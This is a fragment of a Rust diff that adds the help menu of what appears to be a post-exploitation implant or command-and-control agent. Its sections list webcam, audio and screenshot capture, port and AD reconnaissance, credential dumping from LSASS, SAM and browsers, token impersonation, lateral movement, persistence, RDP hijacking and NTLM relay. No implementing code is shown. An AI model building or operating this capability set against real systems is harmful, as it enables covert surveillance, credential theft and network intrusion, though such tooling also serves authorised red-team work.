+        println!("  screenshot-stream <ms> [quality] [max]      Continuous screenshots");
+        println!("  audio <duration> [format]                   Audio capture");
+        println!("  webcam [device] [format]                    Webcam capture");
+        println!("  usb <start|stop|list>                       USB device monitoring");
+
+        println!("\nRECONNAISSANCE");
+        println!("  env <sysinfo|netinfo|vars|whoami>           System information");
+        println!("  scan ports <target> <ports> [threads]       Port scan");
+        println!("  scan ping <subnet> [timeout]                Ping sweep");
+        println!("  scan shares <target>                        Share enumeration");
+        println!("  reg <query|set|delete|enum-keys|enum-values> <path>  Registry operations");
+        println!("  svc <list|query|create|delete|start|stop|modify>     Service management");
+        println!("  ad <users|groups|computers|kerberoast|asreproast|query>  AD enumeration");
+
+        println!("\nCREDENTIAL HARVESTING");
+        println!("  creds <sam|lsass|secrets|dpapi|vault>       Credential dumping");
+        println!("  browser <passwords|cookies|history|all>     Browser data extraction");
+        println!("  token make <user> <pass> [domain]           Create token");
+        println!("  token impersonate <id>                      Impersonate token");
+        println!("  token enable-priv <privilege>               Enable privilege");
+
+        println!("\nLATERAL MOVEMENT");
+        println!("  lateral <psexec|wmi|dcom|winrm|schtask> <target> <cmd>  Lateral movement");
+        println!("  persist <install|remove|list>               Persistence management");
+        println!("  rdp hijack <session_id>                     RDP session hijack");
+        println!("  ntlm-relay <lhost> <lport> <thost> <tport>  NTLM relay\n");
     }
 }
